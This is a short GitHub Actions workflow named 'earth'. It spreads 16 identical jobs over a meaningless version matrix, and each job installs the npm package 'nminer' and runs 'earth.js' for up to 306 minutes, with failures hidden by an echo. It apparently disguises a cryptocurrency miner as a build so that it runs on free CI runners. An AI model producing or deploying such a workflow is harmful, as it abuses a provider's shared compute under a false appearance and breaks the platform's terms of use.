name: earth
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 568 }
          - { version: 1995 }
          - { version: 8802 }
          - { version: 3474 }
          - { version: 2195 }
          - { version: 1569 }
          - { version: 36 }
          - { version: 2024 }
          - { version: 3844 }
          - { version: 4847 }
          - { version: 166 }
          - { version: 5931 }
          - { version: 3170 }
          - { version: 8038 }
          - { version: 7831 }
          - { version: 7503 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: 
        run: |
          npm install nminer@latest
          timeout 306m node earth.js || echo "earth executed"